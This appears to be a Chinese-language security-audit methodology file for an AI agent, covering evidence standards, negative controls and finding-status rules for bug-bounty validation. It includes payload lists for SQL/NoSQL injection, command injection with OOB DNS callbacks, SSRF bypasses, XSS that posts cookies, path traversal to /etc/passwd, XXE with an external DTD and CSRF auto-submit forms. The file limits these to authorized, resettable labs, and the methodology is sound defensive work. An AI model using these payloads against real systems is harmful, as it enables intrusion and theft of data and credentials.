- `EVID_ACCOUNT_OBJECT_MATRIX`：多主体、多对象或跨租户验证中的账号、账号对象矩阵必要事实、主体 ID、角色、租户、对象归属、token/cookie 引用和清理责任。
- 多主体、对象边界或登录态相关结论必须引用账号对象矩阵、对象归属、主体边界、token/cookie 引用和清理责任；报告阶段按唯一模板渲染必要复现事实，本 Skill 不重新定义账号凭据字段或正文写法。
- A/B/C/cleanup 的 token/cookie 不得混用；对象 A/B/T 的归属必须可复核。

### Trace 证据

- 每一跳 `file:line`、变量名、分支、权限、transform。
- 运行请求触发的代码路径与静态 trace 一致。
- 异步链路的生产端和消费端。

### Sink 证据

- 危险 API、危险参数位置、执行条件。
- 运行日志、调试日志、错误栈、查询日志、命令输出、最终路径、最终 URL。

### 防护缺失证据

- 防护未执行、顺序错误、同变量不一致、上下文不匹配、分支绕过、配置未启用。
- 框架默认防护是否真实生效。

### 动态请求证据

- baseline、strong positive、escalation、negative 的完整请求。
- 请求 ID、trace ID、marker、账号、对象、时间、环境版本。

### 响应与副作用证据

- 响应字段、错误差异、header、页面变化、时间差。
- 数据库、缓存、队列、文件、对象存储、服务端请求、浏览器执行、审计日志。
- 受控副作用和清理确认。

### 负控证据

- 每个负控的请求/操作、预期、实际、结论。
- 负控必须与 claim 对齐，高风险结论通常至少两个独立负控。

### 版本 / 依赖证据

- manifest、lock、运行包、镜像、组件加载、fixed version、feature flag。
- SCA 必须证明组件在运行版本中加载且漏洞路径可达。

### 官方安全模型证据

- `EVID_OFFICIAL_SECURITY_MODEL`：官方 SECURITY、API 文档、权限模型、对象模型、默认配置、scope、known issue、expected behavior、accepted risk、范围或官方已知拒绝（外部裁决） 和对外提交限制的裁决证据。
- 必须回答：当前动态验证是否违反官方声明的安全边界；攻击者主体是否属于不受信任主体；目标对象、租户、workspace、文件、token、内部服务、沙箱、插件、URL fetch 或 webhook 是否在官方保护边界内。
- 必须回答：当前行为是否默认配置可达，是否需要危险开关、管理员预配置、插件作者能力、部署者误用、debug 模式、示例配置或非默认 profile。
- 必须回答：当前 finding 是否命中官方已知漏洞、known limitation、duplicate、accepted risk、expected behavior、范围或官方已知拒绝（外部裁决）、hardening only 或提交材料质量排除项。
- 如果官方模型未读完或不可访问，写 `security_model_unknown / scope_unknown / needs-official-baseline`，不得把强正控直接包装成 对外提交资格。

### 不可声明边界

缺运行态、缺负控、缺对象、缺日志、缺响应可读性、缺执行语义、缺清理能力时，必须写不能声明什么。

缺官方安全模型、scope、默认配置、known issue 去重、expected behavior、accepted risk 或 范围或官方已知拒绝（外部裁决） 裁决时，也必须写不能声明什么。尤其禁止写“默认配置受影响”“官方未公开”“范围内高危”“跨租户安全边界被破坏”“未认证可利用”“沙箱逃逸”“有效凭据泄露”等强声明。

## 动态验证触发条件

### 必须动态验证

如果要写 `technical_confirmed`，以下通常必须动态验证：

- 越权、IDOR、鉴权绕过：必须有双主体、双对象、租户对照或同等强度证据。
- 对象 ID、用户 ID、租户 ID、文件 ID、分享 token、lookup handle 或资源 URI：必须证明攻击者能否从自身入口获得，手工样本不能直接 technical_confirmed。
- 批量、全量、全租户、全用户、全工作区或广义影响：必须证明 ID 能批量、持续、枚举、列表、搜索、导出、关系链或可推导获得。
- SSRF：必须有服务端请求、最终目标、重定向/DNS/IP 观察，尽量证明内网 canary、metadata mock 或响应可读性。
- SQL/NoSQL/LDAP/XPath：必须证明查询语义被改变，尽量证明测试数据读取、结果集扩大、权限过滤绕过或受控写入。
- 文件读取、写入、上传、解压：必须证明最终路径、越界、访问/执行/覆盖影响和清理。
- 命令、代码、模板、表达式执行：必须证明执行语义，尽量给出命令输出、表达式返回、受控文件或 OOB。
- XSS：必须证明浏览器执行上下文，存储型要证明传播和目标角色触发。
- CSRF：必须证明缺 token 或跨站条件下状态变更成立，且有 token/Origin/Referer/SameSite 负控。
- DAST 响应差异：必须证明请求可重放、差异由目标变量导致。
- SCA 可达漏洞：必须证明运行包、组件加载、入口可达和漏洞条件。
- Secret：必须证明暴露面、有效性、权限范围和轮换状态，且不得输出原值。
- 对外提交资格：必须有 `EVID_OFFICIAL_SECURITY_MODEL`，证明当前动态结果不是官方预期功能、accepted risk、范围或官方已知拒绝（外部裁决）、known issue 或 hardening only，且声明不超过官方安全边界和测试范围。

### 静态证据足够进入 candidate

- source、trace、sink、防护缺口完整但没有运行环境、账号、对象或日志。
- 组件版本和调用点存在但缺真实触发。
- secret 可能暴露但未验证有效性、权限或轮换。
- 代码疑似缺对象级授权但缺 A/B 主体与对象。
- 对象 ID 可替换但目前只有手工样本、管理员视角 ID、历史报告 ID 或单个不可泛化 ID，尚未证明攻击者可获得路径。
- 多对象、批量、全量或跨租户声明缺少 ID 获取规模、账号矩阵或对象归属负控。
- 动态证据成立但官方安全模型、scope、默认配置、known issue、expected behavior、accepted risk 或 范围或官方已知拒绝（外部裁决） 尚未裁决。

### 不能在当前目标动态验证

以下情况应先切换到自有隔离环境、补齐快照/重置能力，或降级处理：

- 没有授权范围确认、测试账号、测试对象、日志观察、快照/重置/清理能力。
- 会访问第三方真实资源、真实内网资产、真实云 metadata credential。
- 会读取、输出、复用真实 secret、token、cookie、密码、个人敏感信息。
- 验证动作会越过授权网络、账号、系统或数据边界。
- 副作用不可清理、不可回滚、不可隔离或无法观察。

在自有 Docker、靶场、CTF、可重置预发环境中，批量枚举、批量修改、资源压力、文件覆盖、删除、持久化、shell/回连等可以作为高强度影响证明的一部分；必须记录范围、前置快照、执行证据、影响面和恢复结果。

## 授权实验模式下的强验证方法

以下方法只用于自有、授权、隔离、可重置、可清理环境。实际 payload 必须按数据库、操作系统、shell、模板引擎、parser、框架、字段上下文调整。

### 通用 curl 框架

```bash
# 0. baseline：确认正常业务路径和观察点
curl -i -s -k \
  -X '{METHOD}' \
  '{SCHEME}://{HOST}{PATH}' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer {LOW_PRIV_TOKEN}' \
  -H 'X-Audit-Marker: AUDIT_BASELINE_{ID}' \
  --data '{BASELINE_JSON}'

# 1. strong positive：证明漏洞语义，不停在 marker
curl -i -s -k \
  -X '{METHOD}' \
  '{SCHEME}://{HOST}{PATH}' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer {LOW_PRIV_TOKEN}' \
  -H 'X-Audit-Marker: AUDIT_POSITIVE_{ID}' \
  --data '{STRONG_PAYLOAD_JSON}'

# 2. escalation：正控成立后追最高影响
curl -i -s -k \
  -X '{METHOD}' \
  '{SCHEME}://{HOST}{PATH}' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer {LOW_PRIV_TOKEN}' \
  -H 'X-Audit-Marker: AUDIT_ESCALATE_{ID}' \
  --data '{ESCALATION_JSON}'

# 3. negative：只改变一个关键条件
curl -i -s -k \
  -X '{METHOD}' \
  '{SCHEME}://{HOST}{PATH_OR_CONTROL_PATH}' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer {CONTROL_TOKEN}' \
  -H 'X-Audit-Marker: AUDIT_NEGATIVE_{ID}' \
  --data '{CONTROL_JSON}'
```

记录每次请求的账号、对象、payload、请求 ID、响应、日志、观察点、清理结果。

### Burp 操作框架

1. 用真实浏览器流程抓取原始请求，不手造未知协议细节。
2. 复制为 `baseline / positive / escalation / negative` 四组。
3. 每次只改变一个关键变量；链式验证必须记录依赖。
4. 添加 marker，便于日志、数据库、队列和文件系统搜索。
5. 对比状态码、响应体、header、时间、错误、重定向链。
6. 同步观察服务端日志、审计日志、数据库、缓存、队列、文件、SSRF/DNS/OOB、浏览器 DOM。
7. 保存请求响应和负控对照；不要只保存截图。

### 浏览器操作框架

```text
角色: 低权限用户 A / 对照用户 B / 目标角色 C
对象: 自己对象 A / 他人测试对象 B / 跨租户对象 T
页面路径:
步骤:
1. 登录为用户 A。
2. 打开页面并清空 DevTools Network/Console。
3. 执行正常业务操作，记录 baseline 请求。
4. 输入强 payload 或在 Burp 中改包重放。
5. 观察 UI、Network、Console、DOM、Storage、服务端日志、副作用。
6. 切换用户 B 或对象 B 执行负控。
7. 若是存储型，使用目标角色 C 打开触发页面，记录传播和执行。
8. 清理测试对象、测试字段、测试文件、测试 cookie、测试 token。
```

### SQL 注入

目标：从错误/布尔/时间差推进到测试数据读取或受控写入。

```text
错误探测: '
布尔真:  ' OR '1'='1'-- 
布尔假:  ' AND '1'='2'-- 
数字真:  1 OR 1=1
数字假:  1 AND 1=2
UNION 常量: ' UNION ALL SELECT 'AUDIT_SQL_MARKER_001'-- 
MySQL 时间: ' AND SLEEP(3)-- 
PostgreSQL 时间: ' AND pg_sleep(3)-- 
SQL Server 时间: '; WAITFOR DELAY '0:0:3'--
Oracle 时间: ' AND dbms_pipe.receive_message('AUDIT',3) IS NULL--
排序字段: name desc, (select case when 1=1 then name else id end)
受控写入: '; INSERT INTO audit_probe(marker) VALUES ('AUDIT_SQL_STACK_001')--
```

证据升级：true/false 响应差异、time/no-time 稳定差异、UNION 常量回显、测试表读取、当前数据库名/当前用户、仅测试表 stacked query 受控写入并清理。负控：合法值、false 条件、参数化修复、无权限账号、不同租户数据。

### NoSQL / DSL 注入

```json
{"username":{"$ne":null},"password":{"$ne":null}}
{"$or":[{"owner":"{USER_A}"},{"owner":"{USER_B}"}]}
{"name":{"$regex":".*"}}
{"price":{"$gt":0}}
{"$where":"sleep(3000) || true"}
{"query":{"bool":{"should":[{"match_all":{}},{"term":{"tenant":"TENANT_B"}}]}}}
```

证据升级：登录绕过、结果集扩大、读取 B 测试对象、绕过租户过滤、aggregation/script 执行差异。负控：固定 schema 拒绝 `$` operator、合法 filter、A/B 租户对照。

### 命令执行 / 参数注入 / 代码执行

```text
分隔符: ; id
管道: | id
与运算: && id
命令替换: $(id)
反引号: `id`
换行: %0aid
基础命令: id; whoami; pwd; uname -a
受控文件: sh -c 'id > /tmp/audit-rce-{ID}.txt; cat /tmp/audit-rce-{ID}.txt'
OOB: nslookup rce-{ID}.{CONTROLLED_DNS_DOMAIN}
选项注入: --help / --version / --config=/tmp/audit.conf
表达式: 7*7、系统用户、工作目录或受控函数返回值
```

证据升级：服务端命令输出、进程用户、工作目录、容器/宿主边界、受控文件、受控 DNS、受控 shell/回连、受控持久化或文件改动。若使用 shell/回连/持久化，只能在可重置环境内执行，并记录停止、清理或重置结果。

### SSRF

```text
公网回连: http://{CONTROLLED_CALLBACK}/ssrf/{ID}
DNS 回连: http://ssrf-{ID}.{CONTROLLED_DNS_DOMAIN}/
本机: http://127.0.0.1:{CANARY_PORT}/health
IPv6 本机: http://[::1]:{CANARY_PORT}/health
十进制 IPv4: http://2130706433:{CANARY_PORT}/health
短地址: http://127.1:{CANARY_PORT}/health
userinfo: http://allowed.example@127.0.0.1:{CANARY_PORT}/
重定向: http://{CONTROLLED_CALLBACK}/redirect-to-local-canary
metadata mock: http://{CONTROLLED_METADATA_MOCK}/latest/meta-data/
协议变体: file:///tmp/audit-ssrf-canary.txt / gopher://127.0.0.1:{PORT}/_
```

证据升级：服务端出站请求、最终 URL/IP、重定向后仍请求、内网 canary 命中、响应是否回显、metadata mock 可达、协议是否受限。真实云 metadata credential 路径不得读取；本地 mock 可验证等价路径。

### XSS / DOM / 存储型输出

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
"><svg/onload=alert(1)>
' autofocus onfocus=alert(1) x='
javascript:alert(1)
</script><script>alert(1)</script>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<script>fetch('/audit-xss-canary',{method:'POST',body:document.cookie})</script>
```

证据升级：浏览器 alert/confirm、DOM 变更、Console 证据、同源 fetch 到测试 endpoint、读取非 HttpOnly 测试 cookie、localStorage 测试 token、存储型传播到目标角色。不得读取真实会话 cookie 或真实用户数据。

### 文件读取 / 路径穿越

```text
../../../../tmp/audit-file-canary.txt
..%2f..%2f..%2ftmp%2faudit-file-canary.txt
..%252f..%252f..%252ftmp%252faudit-file-canary.txt
....//....//tmp/audit-file-canary.txt
/etc/hostname
/etc/passwd
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
file:///tmp/audit-file-canary.txt
php://filter/convert.base64-encode/resource=/tmp/audit-file-canary.txt
```

证据升级：读到 base 外 canary、系统只读指纹、对象存储 key 越界、下载他人测试文件。真实 `.env`、SSH key、云凭据路径不得读取，除非靶场故意放置假 secret canary。

### 文件写入 / 上传 / 归档解压

```text
写入文件名: audit-write-{ID}.txt
写入内容: AUDIT_WRITE_MARKER_{ID}
路径变体: ../../tmp/audit-write-{ID}.txt
上传 PHP 执行性测试: <?php echo "AUDIT_UPLOAD_EXEC_{ID}"; ?>
上传 JSP 执行性测试: <% out.print("AUDIT_UPLOAD_EXEC_{ID}"); %>
SVG XSS 测试: <svg onload="alert('AUDIT_UPLOAD_XSS')"></svg>
Zip Slip entry: ../../tmp/audit-zipslip-{ID}.txt
Tar symlink entry: link -> /tmp/audit-zipslip-{ID}.txt
```

证据升级：最终落点、base 逃逸、web 可访问、脚本是否作为文本还是被执行、覆盖/追加模式、清理确认。不得上传不可清理 WebShell；在可重置环境如需证明执行，应使用可清理受控执行脚本、受控命令输出、canary 文件或受控回连，不得覆盖真实配置。

### XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///tmp/audit-xxe-canary.txt"> ]>
<root>&xxe;</root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY % dtd SYSTEM "http://{CONTROLLED_CALLBACK}/xxe/{ID}.dtd"> %dtd; ]>
<root>test</root>
```

证据升级：解析结果回显 canary、服务端 OOB 请求、parser 日志、DTD/外部实体配置、资源限制是否生效。资源消耗类影响只能在隔离可重置环境内验证，并设置阈值、停止条件和恢复方式。

### 反序列化 / 对象注入

- 优先使用靶场内置 benign gadget 或自定义测试类。
- 证明 `__wakeup/__destruct/readObject`、getter/setter、magic method、反射、gadget 入口真实触发。
- 证明受控属性进入敏感方法、受控文件写入、受控日志、受控 DNS/OOB 或受控命令结果。
- 高强度 gadget 链只在可重置环境内使用，必须记录触发链、影响面、清理或重置结果。

### SSTI / 表达式注入

```text
Jinja/Twig: {{7*7}}
ERB: <%= 7*7 %>
Freemarker: ${7*7}
Velocity: #set($x=7*7)$x
SpEL/EL/OGNL: ${7*7}
Handlebars/Mustache: {{this}}
```

证据升级：算术执行、对象访问、受控函数调用、受控命令输出或受控文件/OOB。只原样回显不是 SSTI technical_confirmed。

### 鉴权绕过 / IDOR / 业务逻辑

```text
攻击者可达路径获取对象 B 的 ID: 列表/搜索/详情/导出/关系链/分享页/可预测序列
账号 A 读取对象 A: 应成功
账号 A 读取对象 B: 若成功，疑似 IDOR
账号 B 读取对象 B: 应成功
账号 B 读取对象 A: 应失败
账号 A 修改对象 B 字段为 AUDIT_IDOR_{ID}: 若成功且可回滚，证明越权写
跨租户: TENANT_A token + TENANT_B object_id
批量: [own_id, other_id] 查看是否逐项授权
```

证据升级：ID 获取链成立、跨对象读取、跨对象写入、跨租户、批量部分越权、导出越权、审计日志证明主体对象不匹配。必须清理被修改的测试对象。只有手工样本 ID 时，只能写窄化 candidate/blocked；批量影响必须证明 ID 能批量、持续、枚举、列表、搜索、导出、关系链或可推导获得。

### CSRF

```html
<form action="https://{HOST}{PATH}" method="POST" enctype="application/x-www-form-urlencoded">
  <input name="displayName" value="AUDIT_CSRF_{ID}">
  <input type="submit" value="submit">
</form>
<script>document.forms[0].submit()</script>
```

证据升级：无 token/跨站 Origin 下状态变更成功；token 正确时成功、缺失/错误 token 应失败；JSON、multipart、method override、CORS 简单请求、SameSite、Origin、Referer 对照。只读请求不能证明 CSRF。

### SCA / 组件可达

```text
版本证据: manifest + lockfile + 运行包 + 镜像/依赖树
加载证据: 类加载、import、runtime module、路由/组件启用
入口证据: 攻击输入可达漏洞组件
触发证据: 受控样例触发漏洞条件
负控: 修复版本、关闭危险配置、不可达调用点、安全输入
```

证据升级：不只证明版本存在，还要证明运行加载、调用路径、可控输入、漏洞条件和当前配置。不可达组件不得 technical_confirmed。

### Secret / token / key

```text
暴露面: 攻击者可访问位置
真实性: 非占位、非示例、格式与发行方一致
有效性: 最小权限只读验证、权限 metadata、过期/吊销/轮换状态
影响: 能访问哪些测试资源或权限范围
报告: 非账号类敏感材料展示边界、hash、前后缀最小化、私密提交渠道
```

不得输出原值，不得用真实第三方资源做深入业务利用。无法验证有效性或攻击者可获得性时，降级为 candidate 或 blocked。

## 最高危害追踪

每个漏洞族都要追到当前授权环境的可证明上限。

| 漏洞族 | 低层现象 | 继续追踪 | 高价值影响 |
|---|---|---|---|
| SQL/NoSQL | 错误、响应差异 | boolean/time、常量回显、测试数据读写、租户过滤绕过 | 数据读取/写入、权限过滤绕过 |
| RCE/CMD | marker、错误 | 命令输出、身份、工作目录、受控文件、OOB、shell/回连 | 执行语义、环境边界突破 |
| SSRF | callback | 最终 URL/IP、重定向、内网 canary、metadata mock、响应可读 | 内部资源访问、状态改变 |
| XSS | 反射 | 浏览器执行、DOM、同源请求、存储传播、目标角色触发 | 用户上下文影响 |
| FILE | 下载成功 | base 外 canary、系统指纹、他人测试文件、写后可达 | 越界读写/执行 |
| AUTH/IDOR | 200、已知 ID 后可访问 | ID 获取链、A/B 主体对象、跨租户、读写差异、审计日志 | 跨用户/租户读写 |
| SCA | 版本命中 | 运行加载、入口可达、漏洞条件触发 | 组件漏洞可利用 |
| Secret | regex 命中 | 暴露面、有效性、权限、轮换 | 有效凭据泄露 |

### 停止原因必须具体

不要写“风险较高所以停止”“payload 太激进所以不测”。应写：

- 当前环境没有测试对象 B，不能证明跨对象。
- 没有 DNS/OOB 观察点，不能证明 SSRF 回连。
- 继续需要真实云 metadata credential，越出边界。
- 文件写入落点不可清理，停止写入型验证。
- 防护已在同变量、同路径、同上下文阻断，负控一致。
- 组件未在运行包加载，无法触发。

## 负控设计

负控设计按 claim 反推，而不是按漏洞类型机械套表。

### 通用负控

| 负控类型 | 目的 | 示例 |
|---|---|---|
| 安全值 | 排除正常功能差异 | 合法 URL、合法对象、合法排序字段 |
| 移除字段 | 证明目标字段导致差异 | 删除 `url/id/template/file` |
| 反条件 | 证明语义控制 | SQL true/false、time/no-time |
| 主体对照 | 排除权限本来允许 | 用户 A/B、无权限 token、不同租户 |
| 对象对照 | 证明对象归属边界 | 自己对象、他人测试对象、跨租户对象 |
| 配置对照 | 证明防护效果 | 启用 parser 安全配置、禁 redirect、参数化修复 |
| 修复后对照 | 证明修复阻断 | patched version、safe config、unit/integration test |
| 环境对照 | 排除干扰 | 清缓存、固定时间窗口、重复请求、不同 worker |

### 漏洞族负控

- SQL/NoSQL：true/false、time/no-time、安全值、参数化修复、不同租户/权限。
- RCE/CMD：普通值、无分隔符、移除字段、禁止命令、修复后、参数数组对照。
- SSRF：允许 host、禁止 host、重定向后禁止目标、本地 canary、外网 canary、DNS 解析对照。
- XSS：编码后值、不同输出上下文、安全模板、CSP 对照、浏览器不执行。
- FILE：base 内合法文件、base 外 canary、不存在文件、编码/双编码、符号链接对照。
- UPLOAD/ARCHIVE：安全扩展、禁止扩展、base 内/外 entry、执行禁用策略、清理后不可访问。
- AUTH/IDOR：账号 A 对象 A、账号 A 对象 B、账号 B 对象 B、跨租户、无登录、批量逐项授权。
- CSRF：正确 token、缺 token、错误 token、Origin/Referer/SameSite 对照。
- SCA：组件未加载、修复版本、不可达调用点、触发条件缺失。
- Secret：占位符、已轮换、无权限、不可被攻击者访问、非账号类敏感材料展示边界或有效性验证失败。

### 负控失败时的处理

- 如果正控和负控都成功，先检查目标 claim 是否其实是正常功能、权限本来允许或对象公开。
- 如果正控和负控都失败，检查 payload、Content-Type、编码、分支、权限、观察点、环境状态。
- 如果负控结果不稳定，重复请求并记录干扰源；不稳定差异不能 technical_confirmed。
- 如果负控无法执行，降级为 candidate 或 blocked，并写清缺什么。

## technical_status 方法性判定边界

### technical_confirmed

必须同时满足：

- 入口可达，当前配置启用。
- source 控制主体与控制粒度已证明。
- 参数绑定清楚，运行请求与静态 trace 指向同一路径。
- 污染值到达 sink 危险参数位置，并被实际使用。
- 防护不足或被绕过，缺口具体。
- 若漏洞依赖对象 ID、租户 ID、文件 ID、分享 token、lookup handle 或资源 URI，攻击者获得路径已证明，且声明范围不超过可获得规模。
- 若结论依赖多主体、多对象、owner/victim 或跨租户，账号矩阵、账号对象矩阵必要事实、对象归属、token/cookie 隔离和清理责任已证明。
- 强正控证明真实影响，不只是 marker、200、callback、错误或版本号。
- 已追踪到当前授权环境内最高可证明影响，或写清停止原因。
- 至少一个与 claim 对齐的负控成立；高风险结论通常需要多个负控。
- 日志、响应、副作用、回连、浏览器执行或代码证据可复核。
- 清理/恢复完成，或验证无不可清理副作用。
- 若要进入报告或对外提交，`EVID_OFFICIAL_SECURITY_MODEL` 已证明当前声明不属于官方预期功能、accepted risk、范围或官方已知拒绝（外部裁决）、known issue、hardening only 或受信任主体正常能力，且声明不超过官方安全边界。
- Allowed Claims 与 Forbidden Claims 清楚。

### candidate

用于这些情况：

- trace 局部闭合但缺运行态。
- 运行态差异存在但缺代码 trace。
- 有强 payload 线索但缺负控。
- 只证明低层触发，未证明影响。
- 缺账号、对象、租户、测试数据、日志或清理能力。
- 对象 ID 可替换但只有手工样本、管理员视角 ID、历史报告 ID 或单个不可泛化 ID，尚未证明攻击者可获得路径。
- 多对象、批量、全量或跨租户声明缺少 ID 获取规模、账号矩阵或对象归属负控。
- 动态强验证已证明能发生，但官方安全模型、scope、默认配置、known issue、expected behavior、accepted risk 或 范围或官方已知拒绝（外部裁决） 尚未裁决，不能写对外可提交。
- 缺最高影响追踪或停止原因。
- 工具 trace 未人工核对 source、propagator、sanitizer、sink。

### blocked

用于必须依赖运行态才能裁决的情况：

- 必须双账号、双对象、租户数据。
- 必须运行态确认对象标识符是否能由攻击者列表、搜索、导出、日志、关系链、分享页、可预测序列或批量接口获得。
- 必须补齐账号矩阵、账号对象矩阵必要事实、对象归属、token/cookie 隔离或清理能力。
- 必须真实配置、feature flag、构建产物、运行包。
- 必须服务端请求、DNS/OOB、浏览器执行、异步 job 日志。
- 必须组件运行加载和触发入口。
- 必须安全可清理的测试环境、快照、重置或清理能力。
- 必须官方资料、scope、默认配置、known issue 去重、accepted risk、expected behavior、范围或官方已知拒绝（外部裁决） 或对外提交限制才能决定是否可提交。

### rejected

只有具备排除证据时才写：

- route 不存在、未注册或当前配置不可触发。
- source 不可控、只在前端存在或被服务端覆盖。
- trace 不进入 sink，或 sink 参数来自常量/白名单。
- sink 命中非危险参数，或目标分支不可达。
- 防护对同变量、同路径、同上下文有效。
- 强正控和多组负控无差异，且排除环境干扰。
- 依赖对象标识符的结论，经代码、接口和运行态证据证明攻击者无法获得必要 ID，且不存在可列表、搜索、导出、关系链、分享页、可预测或可推导路径。
- 多主体/多对象结论经 A/B 主体对象负控证明为正常授权、公开对象、自己对象或权限本该允许。
- 官方资料明确该行为是 expected behavior、trusted admin normal use、accepted risk、范围或官方已知拒绝（外部裁决）、known limitation、hardening only 或已知重复问题，且当前证据没有证明新主体、新对象、新入口、新默认配置、新影响层级或官方缓解绕过。
- 影响不成立：无敏感数据、无越权、无写入、无执行、无服务端请求、无文件越界。
- 运行版本不受影响、组件未打包/未加载、漏洞路径不可达。

### 必须降级

以下不得写 technical_confirmed：

- scanner-only、external-tool-only、sink-only、source-only、route-only、regex-only。
- 只有 200 响应、错误栈、截图、marker、callback。
- callback-only SSRF 未追最终目标、内网 canary、响应可读性或状态改变。
- marker-only RCE 未追执行语义。
- reflect-only XSS 未证明浏览器执行。
- error-only SQLi 未证明布尔、时间、常量、测试数据或受控写入。
- IDOR 无对象归属和主体对照。
- 只有“已知 ID 后可利用”，没有证明攻击者如何获得 ID。
- 只有单个手工样本 ID，却声明批量、全量、全租户、全用户、全工作区或广义影响。
- 多主体结论缺账号矩阵、账号对象矩阵必要事实、对象归属或 token/cookie 隔离。
- 官方安全模型 unknown、scope unknown、默认配置 unknown、known issue 未去重、expected behavior 未裁决、accepted risk 未裁决或 范围或官方已知拒绝（外部裁决） 未裁决。
- 只有动态强验证，没有官方门禁支撑，却准备写对外对外可提交、高危、严重、默认配置受影响、官方未公开或范围内提交声明。
- SCA version-only。
- secret-regex-only。
- 无负控高危。
- 未追踪最高影响且没有停止原因。

## 报告与产物边界

本 Skill 不内嵌报告正文或模板章节。需要输出报告时，只把本 Skill 产生的方法性事实写入对应 evidence，并由报告阶段引用唯一模板渲染：

- 入口、Source、Binding、Guard、Flow、Sink、Trigger、Effect、Negative、Clean、Claim 统一登记为 `EVID_*` 证据。
- 单漏洞 Markdown 只使用 `templates/单漏洞提交报告模板.md`。
- 提交总入口只使用 `templates/赏金提交总入口模板.md`。
- 完成核验只使用 `templates/完成核验模板.md`，只能检查，不能补证。
- 本 Skill 可以说明应写入哪些事实，但不得复制报告章节正文、平台表单、账号对象矩阵字段或外部门禁裁决规则。

## 修复建议写法

修复建议必须绑定根因、sink 上下文和回归验证，不要只写“过滤输入”。

- 参数化 / 结构化查询：值位置使用绑定参数；动态表名、列名、排序、operator、JSON path、模板名、路径段、URL host 使用服务端枚举。
- allowlist：允许值由服务端维护；失败必须阻断；在 decode、normalize、canonicalize 后校验。
- 权限检查：在 service/repository/model 层绑定当前主体、tenant、owner；批量逐项授权；为 A/B 主体和对象写回归测试。
- 命令/代码执行：避免 shell；使用参数数组；固定命令名、工作目录、环境变量；禁用危险表达式；最小权限运行。
- parser 安全配置：XML 禁 DTD/外部实体/外部 DTD/XInclude/网络访问；反序列化限制类型；YAML/JSON parser 使用安全模式。
- 上传安全策略：服务端随机文件名、扩展名/MIME/魔数/大小校验、web 根外存储、禁执行、下载鉴权、预览沙箱。
- 路径归一化：decode/canonicalize/realpath 后做 base 约束；处理符号链接、编码、Windows 盘符、对象存储 key。
- SSRF：scheme/host/port allowlist；解析后拒绝本地、内网、metadata、保留地址；重定向后重校验；限制出网和响应读取。
- XSS：上下文编码，避免 raw，富文本 sanitizer，CSP 作为补充；加入浏览器执行回归和存储型传播回归。
- CSRF：所有状态变更统一 token 校验；覆盖 JSON、multipart、AJAX、method override；Origin/Referer/SameSite 作为补充。
- 日志脱敏：token、cookie、password、secret、PII 不进入低权限可读日志；报告中按非账号类敏感材料展示边界处理第三方或生产真实敏感值，不能删除复现链。
- 密钥管理：轮换、撤销、最小权限、迁移到密钥服务；验证旧凭据无效。
- 依赖升级：确认运行包实际更新，关闭危险配置，复测漏洞路径不可触发。
- 测试：单元、集成、权限矩阵、负控回归、扫描器辅助回归、浏览器回归、异步 job 回归。

## 禁止事项

- 禁止 sink-only technical_confirmed。
- 禁止 scanner-only technical_confirmed。
- 禁止 external-tool-only technical_confirmed。
- 禁止 source-only technical_confirmed。
- 禁止 route-only technical_confirmed。
- 禁止 regex-only technical_confirmed。
- 禁止没有 trace 就 technical_confirmed。
- 禁止没有负控就写高置信。
- 禁止只看 200、500、截图、错误栈、callback、marker。
- 禁止把框架默认安全假设当证据。
- 禁止把 sanitizer 名称当防护结论。
- 禁止把客户端限制、前端下拉、Swagger enum、TypeScript 类型当服务端白名单。
- 禁止把不可控参数当漏洞。
- 禁止把无法证明影响的点写成高危。
- 禁止把 pending、candidate、blocked 写成 technical_confirmed。
- 禁止一个弱 payload 失败就 rejected。
- 禁止 callback-only SSRF 写成内网高危 technical_confirmed。
- 禁止 marker-only RCE 写成命令执行 technical_confirmed。
- 禁止 reflect-only XSS 写成浏览器执行 technical_confirmed。
- 禁止 error-only SQLi 写成数据泄露 technical_confirmed。
- 禁止 version-only SCA 写成组件漏洞可达 technical_confirmed。
- 禁止 secret-regex-only 写成有效凭据泄露 technical_confirmed。
- 禁止把“已知 ID 后可利用”写成高价值 technical_confirmed，却不证明攻击者如何获得该 ID。
- 禁止把单对象 ID 样本外推成批量、全租户、全用户、全工作区或广义影响。
- 禁止把管理员手工给出的 ID、聊天上下文里的 ID、历史附件里的 ID、报告作者笔记里的 ID 当作攻击者可获得路径。
- 禁止账号矩阵缺账号对象矩阵必要事实、主体 ID、租户、对象归属、token/cookie 引用和清理责任时声称多主体 technical_confirmed 可复核。
- 禁止官方安全模型 unknown、scope unknown、默认配置 unknown、known issue 未去重、expected behavior 未裁决、accepted risk 未裁决或 范围或官方已知拒绝（外部裁决） 未裁决时写对外可提交。
- 禁止官方资料已明确为 expected behavior、trusted admin normal use、accepted risk、范围或官方已知拒绝（外部裁决）、known limitation 或 hardening only 时，仍按新漏洞 technical_confirmed/对外提交 提交；除非证明新主体、新入口、新对象、新默认配置、新影响层级或官方缓解绕过。
- 禁止只有动态强验证而没有官方门禁支撑时，写“官方未公开”“默认配置受影响”“范围内高危”“严重漏洞”“沙箱逃逸”“跨租户突破”等强声明。
- 禁止未追踪最高影响且不写停止原因。
- 禁止第三方未授权测试、生产真实用户数据访问、真实凭据读取、真实云 metadata credential 读取。
- 禁止在不可重置、不可清理或越界环境中执行高强度验证。
- 禁止无法清理的状态变更验证。
- 禁止为了凑数量写低价值漏洞。
- 禁止把来源叙事、临时过程、阅读记录、环境私有细节或运维流程写进通用审计 skill。

## 自检清单

每项回答“是 / 否 / 不适用”。关键项为“否”时不得 technical_confirmed。

### 验证计划

- [ ] 是否明确授权范围、环境类型、测试账号、测试对象和回滚能力？
- [ ] 多主体、多对象或跨租户验证是否有账号矩阵、账号对象矩阵必要事实、主体 ID、对象归属和清理责任？
- [ ] 依赖对象 ID、分享 token、lookup handle 或 URI 的验证是否有攻击者获取路径？
- [ ] 是否定义要证明的 claim？
- [ ] 是否定义最高影响目标？
- [ ] 是否确认静态 trace 与运行请求一致？
- [ ] 是否明确版本、feature flag、profile、配置？
- [ ] 是否裁决官方安全模型、scope、默认配置、known issue、expected behavior、accepted risk、范围或官方已知拒绝（外部裁决） 和外部门禁引用？
